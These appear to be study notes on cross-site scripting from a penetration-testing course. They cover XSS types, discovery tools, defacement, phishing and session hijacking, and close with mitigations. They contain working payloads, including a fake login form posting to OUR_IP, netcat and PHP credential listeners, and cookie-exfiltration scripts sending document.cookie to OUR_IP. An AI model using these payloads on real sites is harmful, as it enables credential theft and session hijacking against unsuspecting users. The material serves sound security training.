# Cross-Site Scripting (XSS)

## 🎯 Main Idea
- XSS exploits poor input sanitization to inject and execute attacker-controlled JavaScript in a victim's browser (client-side only, limited to the browser's JS engine and same domain).
- Three types: Stored/Persistent (saved in DB, affects all visitors — most critical), Reflected (returned by server, non-persistent), DOM-based (processed entirely client-side via JS, never reaches server).
- Impact ranges from defacement to phishing and session hijacking; low impact + high probability = medium risk, so detect, exploit, and prevent.

## 💥 Attack / Exploit Vectors

### Stored (Persistent) XSS
- Injected payload is stored in the back-end DB and executes for every user who views the page (e.g., posts, comments, to-do items).
- Confirm via alert pop-up and by viewing it persist across refreshes / in page source.
- **Commands**
  - `<script>alert(window.origin)</script>` — basic test payload (shows executing origin)
  - `<plaintext>` — stops rendering HTML after it (easy-to-spot test)
  - `<script>print()</script>` — pops print dialog (rarely blocked by browsers)

### Reflected (Non-Persistent) XSS
- Input is reflected back in the server response (error/confirmation messages) without being stored; affects only the targeted user.
- If delivered via GET, craft a malicious URL with the payload in the parameter and send it to the victim.
- **Commands**
  - `http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>` — reflected payload delivered in URL

### DOM-based XSS
- Input flows from a client-side Source (e.g., `document.URL`, URL `#` fragment) into a dangerous Sink without sanitization; no HTTP request is made.
- Sinks: `document.write()`, `DOM.innerHTML`, `DOM.outerHTML`; jQuery `add()`, `after()`, `append()`. `innerHTML` blocks `<script>`, so use event-handler payloads.
- **Commands**
  - `<img src="" onerror=alert(window.origin)>` — HTML-based payload that fires without `<script>` tags
  - `http://SERVER_IP:PORT/#task=<img src='' onerror=alert(window.origin)>` — DOM XSS via URL fragment

### XSS Discovery
- Find injection points via automated scanners, manual payload testing, or (most reliable) code review of Source → Sink.
- Payloads can be injected in input fields and also HTTP headers (Cookie, User-Agent) when their values are displayed.
- **Commands**
  - `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` — run XSStrike on a URL parameter
  - `git clone https://github.com/s0md3v/XSStrike.git` — obtain XSStrike (also Brute XSS, XSSer)

### Defacing
- Use stored XSS to permanently change a page's look (common for "we hacked you" messages).
- Four elements: background color, background image, title, and body text.
- **Commands**
  - `<script>document.body.style.background = "#141d2b"</script>` — change background color
  - `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` — change background image
  - `<script>document.title = 'HackTheBox Academy'</script>` — change page title
  - `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` — overwrite entire page body

### Phishing (Fake Login Injection)
- Inject a fake login form that posts credentials to the attacker's server; clean up the page (remove original form, comment out leftover HTML) to look legitimate.
- Capture creds with a netcat/PHP listener, then redirect the victim back to the real page.
- **Commands**
  - `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');` — write fake login form
  - `<script>document.getElementById('urlform').remove();</script>` — remove the real input form
  - `...PAYLOAD... <!--` — comment out remaining original HTML
  - `sudo nc -lvnp 80` — netcat listener to catch credentials
  - `sudo php -S 0.0.0.0:80` — PHP server (index.php logs creds to creds.txt, then redirects victim)

### Session Hijacking (Cookie Stealing) & Blind XSS
- Steal the victim's session cookie via injected JS and reuse it to log in without credentials.
- Blind XSS: vulnerability triggers on a page you can't see (admin panels, support tickets, User-Agent) — load a remote script named after the field to identify the vulnerable input.
- **Commands**
  - `<script src="http://OUR_IP/script.js"></script>` — load remote script (detect blind XSS / deliver payload)
  - `<script src=http://OUR_IP/username></script>` — field-named remote script to pinpoint vulnerable input
  - `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` — exfiltrate cookies to attacker
  - `document.location='http://OUR_IP/index.php?c='+document.cookie;` — alternative cookie-exfil payload
  - `sudo php -S 0.0.0.0:80` — PHP server (index.php parses and logs cookies to cookies.txt)

## 🛠️ Key Tools & Concepts
- XSStrike / Brute XSS / XSSer — open-source XSS discovery; Nessus / Burp Pro / ZAP — commercial scanners (passive + active).
- PayloadsAllTheThings & Payload-Box — large XSS payload lists.
- Source & Sink — where input enters vs. where it is written to the DOM.
- `netcat` / PHP dev server — attacker listeners for credential and cookie capture.
- Famous cases: Samy Worm (MySpace 2005), TweetDeck self-retweet (2014).

## 🛡️ Mitigations
- Input validation (front-end and back-end, e.g., regex, PHP `FILTER_VALIDATE_EMAIL`).
- Input sanitization: DOMPurify (`DOMPurify.sanitize()`), PHP `addslashes()`; never display raw user input.
- Output HTML encoding: PHP `htmlspecialchars()` / `htmlentities()`, NodeJS `html-entities`.
- Avoid dangerous sinks: `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`; jQuery `html()`, `append()`, `after()`, etc.
- Server config: HTTPS everywhere, `X-Content-Type-Options=nosniff`, `Content-Security-Policy` (`script-src 'self'`), `HttpOnly` + `Secure` cookie flags, and a WAF.
